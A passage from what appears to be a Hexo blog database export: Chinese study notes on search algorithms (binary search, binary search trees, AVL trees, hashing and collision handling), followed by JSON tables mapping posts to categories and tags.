href=\"#记录的查找概率不相等时如何提高查找效率\" class=\"headerlink\" title=\"记录的查找概率不相等时如何提高查找效率\"></a>记录的查找概率不相等时如何提高查找效率</h5><p>按照查找概率高低存储</p>\n<h5 id=\"记录的查找概率无法测定时如何提高查找效率\"><a href=\"#记录的查找概率无法测定时如何提高查找效率\" class=\"headerlink\" title=\"记录的查找概率无法测定时如何提高查找效率\"></a>记录的查找概率无法测定时如何提高查找效率</h5><p>按查找概率动态调整记录顺序</p>\n<p>1)在每个记录中设一个访问频度域</p>\n<p>2)始终保持记录按非递增有序的次序排列</p>\n<p>3)每次查找后均将刚查到的记录直接移至表头</p>\n<h3 id=\"折半查找\"><a href=\"#折半查找\" class=\"headerlink\" title=\"折半查找\"></a>折半查找</h3><p>特点:每次将待查记录所在区间缩小一半</p>\n<p><strong>ASL=log<sub>2</sub>(n+1)-1</strong></p>\n<p>缺点:只适合有序表且仅限于顺序存储结构</p>\n<p>时间复杂度O(log<sub>2</sub>(n))</p>\n<p>mid=(low+high)/2</p>\n<p>key&lt;mid则:high=mid-1</p>\n<p>key&gt;mid则:low=mid+1</p>\n<p>key=mid,找到</p>\n<p>high&lt;low,结束,未找到</p>\n<p>判定树,按照查找次数和层数对应建树</p>\n<p>比较次数&lt;=树的深度</p>\n<p>满二叉树深度D=log<sub>2</sub>(n)+1</p>\n<p><img src=\"/images/%E6%9F%A5%E6%89%BE/image-20211230172538718.png\" alt=\"image-20211230172538718\"></p>\n<h3 id=\"分块查找\"><a href=\"#分块查找\" class=\"headerlink\" title=\"分块查找\"></a>分块查找</h3><p>优点:插入和删除比较容易,无需进行大量移动</p>\n<p>缺点:要增加一个索引表的存储空间并对厨师索引表进行排序运算</p>\n<p>适用情况:如果线性表既要快速查找又经常动态变化,则可采用分块查找</p>\n<p>步骤:</p>\n<p>1.将表分成几块,表或者有序,或者分块有序(第二块中所有元素值比第一块大)</p>\n<p>2.建立索引表</p>\n<h4 id=\"二叉排序树\"><a href=\"#二叉排序树\" class=\"headerlink\" title=\"二叉排序树\"></a>二叉排序树</h4><p>又称为二叉搜索树,二叉查找树</p>\n<p>二叉排序树或是空树,或是满足如下性质的二叉树:</p>\n<ul>\n<li>若其左子树非空,则左子树上所有结点的值均小于根节点的值</li>\n<li>若其右子树为空,则右子树上所有结点的值均大于等于根节点的值</li>\n<li>其左右子树本身又各是一棵二叉排序树</li>\n</ul>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">BStree <span class=\"title\">SearchBST</span><span class=\"params\">(BSTree T,KeyType key)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>((!T)||key==T-&gt;data.key) <span class=\"keyword\">return</span> T;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(key&lt;T-&gt;data.key)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">SearchBST</span>(T-&gt;lchild,key);</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">return</span> <span class=\"built_in\">SearchBST</span>(T-&gt;rchild,key);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>ASL</p>\n<p>二叉排序树每层各个结点的比较次数等于该层高度</p>\n<p>含有n个结点的二叉排序树的平均查找长度和树的形态有关</p>\n<p><strong>最好情况</strong>,形态比较均衡,ASL=log2(n+1)-1;</p>\n<p>O(log<sub>2</sub>(n))</p>\n<p><strong>最坏情况</strong>:,单支树,退化成顺序查找</p>\n<p>ASL=(n+1)/2</p>\n<p>O(n)</p>\n<p><strong>不同插入次序的序列生成不同形态的二叉排序树</strong></p>\n<p>二叉排序树—插入操作</p>\n<p>根据大小选择左右子树,找到某个叶子结点的左子树或者右子树为空,则插入节点为该叶子结点的左孩子或者右孩子</p>\n<p>二叉排序树—删除操作</p>\n<ul>\n<li><p>被删除的节点是叶子结点,直接删除即可</p>\n</li>\n<li><p>被删除的节点只有左子树或者只有右子树,用其左子树或者右子树替换它即可</p>\n</li>\n<li><p>被删除的节点既有左子树,也有右子树</p>\n</li>\n</ul>\n<p>用它中序遍历序列的前驱来代替它,前驱是左子树中最大的结点</p>\n<p>也可以用其后继替换之,后继是右子树中最小的结点</p>\n<h4 id=\"平衡二叉树\"><a href=\"#平衡二叉树\" class=\"headerlink\" title=\"平衡二叉树\"></a>平衡二叉树</h4><p>平衡二叉树又称AVL树,一棵平衡二叉树或者是空树,或者是具有下列性质的二叉排序树:</p>\n<ul>\n<li>左子树与右子树的高度之差的绝对值小于等于1</li>\n<li>左子树和右子树也是平衡二叉排序树</li>\n</ul>\n<p>平衡因子=结点左子树的高度-结点右子树的高度</p>\n<p><strong>对于一棵有n个结点的AVL树,其高度保持在O(log2(n))数量级,ASL也保持在O(log2(n))量级</strong></p>\n<p>失衡调整</p>\n<ul>\n<li>LL</li>\n<li>LR</li>\n<li>RL</li>\n<li>RR</li>\n</ul>\n<p>调整原则:自己慢慢分析,没必要背口诀</p>\n<ul>\n<li>降低高度</li>\n<li>保持二叉排序树性质(一般都是选取中等大小的节点上升)</li>\n<li>出现多个平衡因子绝对值相等的失衡节点,找最小的失衡子树进行调整</li>\n<li>失去父节点的子节点尽量更换到跟自己差值比较小的父节点</li>\n</ul>\n<p>根据所给序列建立平衡二叉树时,需要边插入边检查是否失衡,并进行调整</p>\n<h4 id=\"散列表查找\"><a href=\"#散列表查找\" class=\"headerlink\" title=\"散列表查找\"></a>散列表查找</h4><p>优点:查找效率高</p>\n<p>缺点:空间效率低</p>\n<p>散列表基本思想:记录的存储位置与关键字之间存在对应关系</p>\n<h5 id=\"冲突\"><a href=\"#冲突\" class=\"headerlink\" title=\"冲突\"></a>冲突</h5><p>不同关键字映射到同一个散列地址</p>\n<h5 id=\"好的散列函数应满足\"><a href=\"#好的散列函数应满足\" class=\"headerlink\" title=\"好的散列函数应满足\"></a>好的散列函数应满足</h5><ul>\n<li>所选函数尽可能简单,以便提高转换速度</li>\n<li>所选函数对关键码计算出的地址,应在整个地址区间中均匀分布,以减少空间浪费</li>\n</ul>\n<h5 id=\"一些常见方法\"><a href=\"#一些常见方法\" class=\"headerlink\" title=\"一些常见方法\"></a>一些常见方法</h5><p>​    1.直接定址法</p>\n<p>hash(key)=a key+b</p>\n<p>优点:以关键字的某个线性函数值为散列地址,不会产生冲突</p>\n<p>缺点:浪费空间</p>\n<p>​    2.除留余数法</p>\n<p>hash(key)=key mod p</p>\n<p><strong>选取p的技巧</strong></p>\n<p>设表长为m,取p&lt;=m且p为质数</p>\n<h3 id=\"常用解决冲突的方法\"><a href=\"#常用解决冲突的方法\" class=\"headerlink\" title=\"常用解决冲突的方法\"></a>常用解决冲突的方法</h3><h4 id=\"开放地址法\"><a href=\"#开放地址法\" class=\"headerlink\" title=\"开放地址法\"></a>开放地址法</h4><p>基本思想:有冲突的时候就去寻找下一个空的散列地址,只要散列表足够大,空的散列地址总能找到,并将数据元素存入</p>\n<p>例如:除留余数法 H<sub>i</sub>=(Hash(key)+d<sub>i</sub>)mod m,d<sub>i</sub>为增量序列</p>\n<p><strong>常用方法</strong></p>\n<p>α=表中填入的记录数/哈希表的长度</p>\n<p><img src=\"/images/%E6%9F%A5%E6%89%BE/image-20211231011652431.png\" alt=\"image-20211231011652431\"></p>\n<h5 id=\"线性探测法\"><a href=\"#线性探测法\" class=\"headerlink\" title=\"线性探测法\"></a>线性探测法</h5><p>增量序列d<sub>i</sub>为线性序列</p>\n<h5 id=\"二次探测法\"><a href=\"#二次探测法\" class=\"headerlink\" title=\"二次探测法\"></a>二次探测法</h5><p>增量序列d<sub>i</sub>为二次序列1²,(-1)², 2², (-2)²  ….  ,q² 二次序列</p>\n<h5 id=\"伪随机探测法\"><a href=\"#伪随机探测法\" class=\"headerlink\" title=\"伪随机探测法\"></a>伪随机探测法</h5><p>增量序列d<sub>i</sub>为伪随机数</p>\n<h4 id=\"再哈希法\"><a href=\"#再哈希法\" class=\"headerlink\" title=\"再哈希法\"></a>再哈希法</h4><h4 id=\"链地址法-拉链法\"><a href=\"#链地址法-拉链法\" class=\"headerlink\" title=\"链地址法(拉链法)\"></a>链地址法(拉链法)</h4><p><strong>优点:</strong></p>\n<p>1.非同义词不会冲突,无”聚集”现象</p>\n<p>2.链表上节点空间动态申请,更适合于表长不确定的情况</p>\n<p>基本思想:相同散列地址的记录链成一单链表</p>\n<p>m个散列地址就设m个单链表,然后用一个数组将m个单链表的表头指针存储起来,形成一个动态的结构</p>\n<h4 id=\"建立一个公共溢出区\"><a href=\"#建立一个公共溢出区\" class=\"headerlink\" title=\"建立一个公共溢出区\"></a>建立一个公共溢出区</h4>"}],"PostAsset":[],"PostCategory":[{"post_id":"ckyiip9lt0003gsw9a25za363","category_id":"ckyiip9lx0006gsw9db52h9sn","_id":"ckyiip9m5000ggsw9b8atbsym"},{"post_id":"ckyiip9lv0005gsw97j3w35p8","category_id":"ckyiip9m2000cgsw90wup4vsv","_id":"ckyiip9m9000ngsw9a2l4ajh8"},{"post_id":"ckyiip9lz0009gsw91wskf4i8","category_id":"ckyiip9m5000hgsw9g40k8ov9","_id":"ckyiip9mc000tgsw90qb67xy6"},{"post_id":"ckyiip9ma000qgsw9f3cr2l18","category_id":"ckyiip9m5000hgsw9g40k8ov9","_id":"ckyiip9mf000ygsw95jjzhf6g"},{"post_id":"ckyiip9m1000agsw9bgpzhdfc","category_id":"ckyiip9m9000ogsw99rrk251f","_id":"ckyiip9mi0011gsw9aehg1ew8"},{"post_id":"ckyiip9mb000sgsw9btqrcdyv","category_id":"ckyiip9m5000hgsw9g40k8ov9","_id":"ckyiip9mk0015gsw93d227qar"},{"post_id":"ckyiip9md000wgsw95kzcge30","category_id":"ckyiip9lx0006gsw9db52h9sn","_id":"ckyiip9ml0018gsw9apm8a1tm"},{"post_id":"ckyiip9m1000bgsw96tdc1wn8","category_id":"ckyiip9m9000ogsw99rrk251f","_id":"ckyiip9mm001cgsw91brb9ldd"},{"post_id":"ckyiip9mf000xgsw94mcf7m0v","category_id":"ckyiip9lx0006gsw9db52h9sn","_id":"ckyiip9mn001egsw933mx5sc0"},{"post_id":"ckyiip9mg0010gsw97svsbyek","category_id":"ckyiip9lx0006gsw9db52h9sn","_id":"ckyiip9ms001igsw9bsj02pg4"},{"post_id":"ckyiip9mj0014gsw9dng6cko3","category_id":"ckyiip9lx0006gsw9db52h9sn","_id":"ckyiip9mt001kgsw95arn7v5j"},{"post_id":"ckyiip9m3000egsw9ahvt55nz","category_id":"ckyiip9mg000zgsw9g59n0fp3","_id":"ckyiip9mv001pgsw9b90bdfof"},{"post_id":"ckyiip9mk0017gsw9an742dxw","category_id":"ckyiip9lx0006gsw9db52h9sn","_id":"ckyiip9n6001sgsw99kfza5xu"},{"post_id":"ckyiip9ml001bgsw9hguleepo","category_id":"ckyiip9lx0006gsw9db52h9sn","_id":"ckyiip9n7001xgsw99v520bw7"},{"post_id":"ckyiip9m4000fgsw96eqc6pjo","category_id":"ckyiip9ml0019gsw90kwxcpcz","_id":"ckyiip9n90020gsw93v56atid"},{"post_id":"ckyiip9mr001hgsw93juu2wuk","category_id":"ckyiip9lx0006gsw9db52h9sn","_id":"ckyiip9na0023gsw9bgir0gsj"},{"post_id":"ckyiip9m6000jgsw9azac7kxf","category_id":"ckyiip9ml0019gsw90kwxcpcz","_id":"ckyiip9nb0026gsw94g2l7iu9"},{"post_id":"ckyiip9ms001jgsw94ahg938l","category_id":"ckyiip9m9000ogsw99rrk251f","_id":"ckyiip9nc0029gsw95cj7hqyn"},{"post_id":"ckyiip9m8000lgsw940zv9qj4","category_id":"ckyiip9ml0019gsw90kwxcpcz","_id":"ckyiip9nd002cgsw9g2t5heb5"},{"post_id":"ckyiip9mw001rgsw94izpa0mw","category_id":"ckyiip9ml0019gsw90kwxcpcz","_id":"ckyiip9ne002fgsw9eik6bqe9"},{"post_id":"ckyiip9mm001dgsw975xady3t","category_id":"ckyiip9n6001tgsw9dekw7zj5","_id":"ckyiip9nf002kgsw9130qastz"},{"post_id":"ckyiip9mu001ogsw94jiu5byb","category_id":"ckyiip9n90021gsw93gb12luv","_id":"ckyiip9nf002mgsw9dbkj97sw"},{"post_id":"ckyiip9n7001wgsw998ji00qi","category_id":"ckyiip9nb0027gsw93laz2a5s","_id":"ckyiip9ng002pgsw96cuw9irl"},{"post_id":"ckyiip9nd002egsw991ox1g90","category_id":"ckyiip9lx0006gsw9db52h9sn","_id":"ckyiip9ng002rgsw90x6bgxch"},{"post_id":"ckyiip9n8001zgsw94ydu095q","category_id":"ckyiip9ne002ggsw94a6v3shd","_id":"ckyiip9ng002ugsw93vf4gp7g"},{"post_id":"ckyiip9na0022gsw9as3c968w","category_id":"ckyiip9nf002ngsw97nfeg3jf","_id":"ckyiip9ng002xgsw95oo0618r"},{"post_id":"ckyiip9nb0025gsw981ux20ld","category_id":"ckyiip9ng002sgsw9buzffpe5","_id":"ckyiip9nh0030gsw93gtd92n5"},{"post_id":"ckyiip9nc0028gsw95sg9gy1c","category_id":"ckyiip9nh002ygsw9d6n5e6rj","_id":"ckyiip9ni0033gsw9hr6bgk2r"},{"post_id":"ckyiip9nc002bgsw91zw94vts","category_id":"ckyiip9nh002ygsw9d6n5e6rj","_id":"ckyiip9ni0036gsw9f22n4ewj"}],"PostTag":[{"post_id":"ckyiip9lt0003gsw9a25za363","tag_id":"ckyiip9ly0007gsw97tj2fb4p","_id":"ckyiip9m7000kgsw9f3h20t2u"},{"post_id":"ckyiip9lt0003gsw9a25za363","tag_id":"ckyiip9m2000dgsw9d537hzpw","_id":"ckyiip9m9000mgsw9akub44fe"},{"post_id":"ckyiip9lv0005gsw97j3w35p8","tag_id":"ckyiip9m6000igsw9c5ifbu17","_id":"ckyiip9ma000rgsw917vs88dx"},{"post_id":"ckyiip9lz0009gsw91wskf4i8","tag_id":"ckyiip9m9000pgsw9cmzh9moe","_id":"ckyiip9mi0013gsw9cjpe63ok"},{"post_id":"ckyiip9lz0009gsw91wskf4i8","tag_id":"ckyiip9mc000vgsw9hlpi6lou","_id":"ckyiip9mk0016gsw9hr45bu60"},{"post_id":"ckyiip9mr001hgsw93juu2wuk","tag_id":"ckyiip9ly0007gsw97tj2fb4p","_id":"ckyiip9mu001mgsw94jp30ce8"},{"post_id":"ckyiip9m1000agsw9bgpzhdfc","tag_id":"ckyiip9mi0012gsw94atv18s0","_id":"ckyiip9mw001qgsw9az1f98cr"},{"post_id":"ckyiip9m1000agsw9bgpzhdfc","tag_id":"ckyiip9ml001agsw9ebtr462b","_id":"ckyiip9n6001ugsw90e8e7fgz"},{"post_id":"ckyiip9m1000agsw9bgpzhdfc","tag_id":"ckyiip9mo001ggsw9fxjpgh22","_id":"ckyiip9n8001ygsw9h8ax5s21"},{"post_id":"ckyiip9m1000bgsw96tdc1wn8","tag_id":"ckyiip9mi0012gsw94atv18s0","_id":"ckyiip9nd002dgsw97vzdb2fi"},{"post_id":"ckyiip9m1000bgsw96tdc1wn8","tag_id":"ckyiip9n7001vgsw96p3oh05s","_id":"ckyiip9ne002hgsw91z4kb6fd"},{"post_id":"ckyiip9m1000bgsw96tdc1wn8","tag_id":"ckyiip9na0024gsw9bjou0vnb","_id":"ckyiip9nf002lgsw9gmpqada2"},{"post_id":"ckyiip9m3000egsw9ahvt55nz","tag_id":"ckyiip9nc002agsw9h1pk4hvi","_id":"ckyiip9ng002qgsw9czun39o2"},{"post_id":"ckyiip9m3000egsw9ahvt55nz","tag_id":"ckyiip9ne002igsw9er8t1vto","_id":"ckyiip9ng002tgsw9gg57h2v1"},{"post_id":"ckyiip9m4000fgsw96eqc6pjo","tag_id":"ckyiip9nf002ogsw91m3s7fnz","_id":"ckyiip9ng002wgsw903i37qfu"},{"post_id":"ckyiip9m6000jgsw9azac7kxf","tag_id":"ckyiip9ng002vgsw9h1lv5r5m","_id":"ckyiip9ni0035gsw91myl9per"},{"post_id":"ckyiip9m6000jgsw9azac7kxf","tag_id":"ckyiip9ne002igsw9er8t1vto","_id":"ckyiip9ni0037gsw9aibdcanb"},{"post_id":"ckyiip9m6000jgsw9azac7kxf","tag_id":"ckyiip9nh0032gsw97t1y4quc","_id":"ckyiip9ni0039gsw935ia0wgo"},{"post_id":"ckyiip9m8000lgsw940zv9qj4","tag_id":"ckyiip9ng002vgsw9h1lv5r5m","_id":"ckyiip9nj003agsw90nyeaw8c"},{"post_id":"ckyiip9ma000qgsw9f3cr2l18","tag_id":"ckyiip9ni0038gsw9arus31ze","_id":"ckyiip9nj003dgsw90tugh6vw"},{"post_id":"ckyiip9ma000qgsw9f3cr2l18","tag_id":"ckyiip9nj003bgsw99cvj4tvj","_id":"ckyiip9nj003egsw92yi38yym"},{"post_id":"ckyiip9mb000sgsw9btqrcdyv","tag_id":"ckyiip9nj003cgsw98ds2hy8h","_id":"ckyiip9nk003hgsw9b4i9alqs"},{"post_id":"ckyiip9mb000sgsw9btqrcdyv","tag_id":"ckyiip9nj003fgsw92w0e3pxg","_id":"ckyiip9nk003igsw94uvu8diw"},{"post_id":"ckyiip9md000wgsw95kzcge30","tag_id":"ckyiip9ly0007gsw97tj2fb4p","_id":"ckyiip9nk003kgsw97pua2xoe"},{"post_id":"ckyiip9md000wgsw95kzcge30","tag_id":"ckyiip9nj003ggsw92qj5c46z","_id":"ckyiip9nk003lgsw95glphpvs"},{"post_id":"ckyiip9mf000xgsw94mcf7m0v","tag_id":"ckyiip9nk003jgsw998zb1tm3","_id":"ckyiip9nk003ngsw91m0090qx"},{"post_id":"ckyiip9mg0010gsw97svsbyek","tag_id":"ckyiip9nk003mgsw9fb694dom","_id":"ckyiip9nk003pgsw9f2q2dx30"},{"post_id":"ckyiip9mg0010gsw97svsbyek","tag_id":"ckyiip9ly0007gsw97tj2fb4p","_id":"ckyiip9nl003qgsw9687lcdg8"},{"post_id":"ckyiip9mj0014gsw9dng6cko3","tag_id":"ckyiip9ly0007gsw97tj2fb4p","_id":"ckyiip9nl003sgsw9eex9hebg"},{"post_id":"ckyiip9mj0014gsw9dng6cko3","tag_id":"ckyiip9nk003ogsw979r46i7l","_id":"ckyiip9nl003tgsw93557h0tq"},{"post_id":"ckyiip9mk0017gsw9an742dxw","tag_id":"ckyiip9ly0007gsw97tj2fb4p","_id":"ckyiip9nl003vgsw9gvfdferw"},{"post_id":"ckyiip9mk0017gsw9an742dxw","tag_id":"ckyiip9nl003rgsw9dntmex1x","_id":"ckyiip9nl003wgsw9a436890i"},{"post_id":"ckyiip9ml001bgsw9hguleepo","tag_id":"ckyiip9ly0007gsw97tj2fb4p","_id":"ckyiip9nm003ygsw9gx0e5drf"},{"post_id":"ckyiip9ml001bgsw9hguleepo","tag_id":"ckyiip9nl003ugsw99ab778m7","_id":"ckyiip9nm003zgsw99g015z61"},{"post_id":"ckyiip9mm001dgsw975xady3t","tag_id":"ckyiip9nl003ugsw99ab778m7","_id":"ckyiip9nm0041gsw9en35gq9h"},{"post_id":"ckyiip9mm001dgsw975xady3t","tag_id":"ckyiip9ly0007gsw97tj2fb4p","_id":"ckyiip9nm0042gsw92c2fhd9g"},{"post_id":"ckyiip9ms001jgsw94ahg938l","tag_id":"ckyiip9nm0040gsw91bhy9nau","_id":"ckyiip9nm0044gsw9cj5bhndg"},{"post_id":"ckyiip9ms001jgsw94ahg938l","tag_id":"ckyiip9mi0012gsw94atv18s0","_id":"ckyiip9nm0045gsw90nhzcshw"},{"post_id":"ckyiip9mu001ogsw94jiu5byb","tag_id":"ckyiip9nm0043gsw99uzzh79a","_id":"ckyiip9nn0048gsw97rsqbhom"},{"post_id":"ckyiip9mu001ogsw94jiu5byb","tag_id":"ckyiip9nm0046gsw9anlrg1pr","_id":"ckyiip9nn0049gsw9g5cnd5rl"},{"post_id":"ckyiip9mw001rgsw94izpa0mw","tag_id":"ckyiip9nn0047gsw99k0f8l2r","_id":"ckyiip9nn004bgsw9hvwp2ivd"},{"post_id":"ckyiip9n7001wgsw998ji00qi","tag_id":"ckyiip9nn004agsw9c6pfei42","_id":"ckyiip9no004egsw94o2vhv3k"},{"post_id":"ckyiip9n7001wgsw998ji00qi","tag_id":"ckyiip9nn004cgsw950ij7569","_id":"ckyiip9no004fgsw941vh739l"},{"post_id":"ckyiip9n8001zgsw94ydu095q","tag_id":"ckyiip9no004dgsw97of4ejbn","_id":"ckyiip9no004hgsw9h16fcuk9"},{"post_id":"ckyiip9na0022gsw9as3c968w","tag_id":"ckyiip9no004ggsw910uh93tc","_id":"ckyiip9np004jgsw997iz6cwp"},{"post_id":"ckyiip9nb0025gsw981ux20ld","tag_id":"ckyiip9no004ggsw910uh93tc","_id":"ckyiip9np004mgsw96r06az2t"},{"post_id":"ckyiip9nb0025gsw981ux20ld","tag_id":"ckyiip9np004kgsw987kff81p","_id":"ckyiip9np004ngsw9eiwwh2qw"},{"post_id":"ckyiip9nc0028gsw95sg9gy1c","tag_id":"ckyiip9np004lgsw95lnlbtsd","_id":"ckyiip9nq004pgsw96uob5hh3"},{"post_id":"ckyiip9nc002bgsw91zw94vts","tag_id":"ckyiip9np004ogsw96qqh51x8","_id":"ckyiip9nq004sgsw9hgi76jtf"},{"post_id":"ckyiip9nc002bgsw91zw94vts","tag_id":"ckyiip9nq004qgsw9e0f5hzi5","_id":"ckyiip9nq004tgsw9bm3t1xyy"},{"post_id":"ckyiip9nd002egsw991ox1g90","tag_id":"ckyiip9nq004rgsw90hj477y7","_id":"ckyiip9nq004ugsw9949d6ugo"},{"post_id":"ckyiip9nd002egsw991ox1g90","tag_id":"ckyiip9ly0007gsw97tj2fb4p","_id":"ckyiip9nq004vgsw9fi2p6k3a"}],"Tag":[{"name":"java","_id":"ckyiip9ly0007gsw97tj2fb4p"},{"name":"数据库","_id":"ckyiip9m2000dgsw9d537hzpw"},{"name":"-c# -异常处理","_id":"ckyiip9m6000igsw9c5ifbu17"},{"name":"cmd","_id":"ckyiip9m9000pgsw9cmzh9moe"},{"name":"编码","_id":"ckyiip9mc000vgsw9hlpi6lou"},{"name":"linux","_id":"ckyiip9mi0012gsw94atv18s0"},{"name":"centos","_id":"ckyiip9ml001agsw9ebtr462b"},{"name":"firwall","_id":"ckyiip9mo001ggsw9fxjpgh22"},{"name":"bash","_id":"ckyiip9n7001vgsw96p3oh05s"},{"name":"find","_id":"ckyiip9na0024gsw9bjou0vnb"},{"name":"git","_id":"ckyiip9nc002agsw9h1pk4hvi"},{"name":"github","_id":"ckyiip9ne002igsw9er8t1vto"},{"name":"-hexo -Next主题搜索功能","_id":"ckyiip9nf002ogsw91m3s7fnz"},{"name":"hexo","_id":"ckyiip9ng002vgsw9h1lv5r5m"},{"name":"github公钥设置","_id":"ckyiip9nh0032gsw97t1y4quc"},{"name":"IDEA","_id":"ckyiip9ni0038gsw9arus31ze"},{"name":"快捷键","_id":"ckyiip9nj003bgsw99cvj4tvj"},{"name":"插件下载","_id":"ckyiip9nj003cgsw98ds2hy8h"},{"name":"小技巧","_id":"ckyiip9nj003fgsw92w0e3pxg"},{"name":"UI","_id":"ckyiip9nj003ggsw92qj5c46z"},{"name":"java_web","_id":"ckyiip9nk003jgsw998zb1tm3"},{"name":"javaWeb","_id":"ckyiip9nk003mgsw9fb694dom"},{"name":"reflection","_id":"ckyiip9nk003ogsw979r46i7l"},{"name":"多线程","_id":"ckyiip9nl003rgsw9dntmex1x"},{"name":"正则表达式","_id":"ckyiip9nl003ugsw99ab778m7"},{"name":"kail","_id":"ckyiip9nm0040gsw91bhy9nau"},{"name":"nmap","_id":"ckyiip9nm0043gsw99uzzh79a"},{"name":"端口扫描","_id":"ckyiip9nm0046gsw9anlrg1pr"},{"name":"hexo上传图片","_id":"ckyiip9nn0047gsw99k0f8l2r"},{"name":"RCE","_id":"ckyiip9nn004agsw9c6pfei42"},{"name":"php","_id":"ckyiip9nn004cgsw950ij7569"},{"name":"sqli-labs","_id":"ckyiip9no004dgsw97of4ejbn"},{"name":"xxe","_id":"ckyiip9no004ggsw910uh93tc"},{"name":"ctf","_id":"ckyiip9np004kgsw987kff81p"},{"name":"-cpp -数据结构 -二叉树","_id":"ckyiip9np004lgsw95lnlbtsd"},{"name":"数据结构","_id":"ckyiip9np004ogsw96qqh51x8"},{"name":"c/c++","_id":"ckyiip9nq004qgsw9e0f5hzi5"},{"name":"接口interface","_id":"ckyiip9nq004rgsw90hj477y7"}]}}